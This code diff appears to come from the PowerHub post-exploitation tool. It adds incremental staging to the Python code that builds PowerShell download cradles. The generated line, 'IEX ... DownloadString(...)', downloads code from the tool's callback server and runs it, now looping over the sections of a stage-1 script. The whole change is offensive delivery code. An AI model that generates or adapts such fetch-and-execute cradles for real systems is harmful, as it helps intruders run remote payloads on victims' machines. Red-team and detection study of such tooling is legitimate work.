@@ -6,7 +6,7 @@ import random
 import re
 import string
 
-from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key
+from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key, Memoize
 from powerhub.modules import sanitize_ps1
 from powerhub.directories import directories
 
@@ -42,6 +42,24 @@ def webdav_url():
     )
 
 
+@Memoize
+def get_stager_increments():
+    """Return number of sections in stage 1"""
+
+    filename = os.path.join(
+        directories.BASE_DIR,
+        'templates',
+        'powershell',
+        'stage1.ps1',
+    )
+
+    with open(filename, 'r') as fp:
+        content = fp.read()
+
+    result = len(content.split('{{separator}}'))
+    return result
+
+
 def build_cradle_https(params):
     result = ''
 
@@ -64,7 +82,7 @@ def build_cradle_https(params):
     return result
 
 
-def build_cradle_webclient(params, key):
+def build_cradle_webclient(params, key, incremental=False):
     result = ''
     natural = params['natural']
     web_client = symbol_name('web_client', natural=natural, refresh=True)
@@ -94,11 +112,26 @@ def build_cradle_webclient(params, key):
         # Make b64 encoding urlsafe
         query = query.replace('/', '_').replace('+', '-')
 
-        result += "IEX $%(web_client)s.DownloadString('%(url)s%(query)s')"
+        downloader = "IEX $%(web_client)s.DownloadString('%(url)s%(query)s'%(extra)s)"
+
+        if incremental:
+            result += "(0..%(increments)s)|%%%%{" + downloader + "}"
+            # quadruple `%`, because we need to format that string a
+            # second time later
+            query += '/'
+            extra = '+$_'
+            increments = get_stager_increments() - 1  # -1 cause we start at 0
+        else:
+            result += downloader
+            extra = ''
+            increments = 0
+
         result = result % dict(
             url=url,
             query=query,
+            extra=extra,
             web_client=web_client,
+            increments=increments,
         )
 
     return result
@@ -117,7 +150,7 @@ def build_cradle(params, key):
     if params['kex'] == 'oob' and key:
         result += "$%(key_var)s='%(key)s';"
 
-    result += build_cradle_webclient(params, key)
+    result += build_cradle_webclient(params, key, incremental=params['incremental'])
 
     result = result % dict(
         url=callback_urls()[params['transport']],
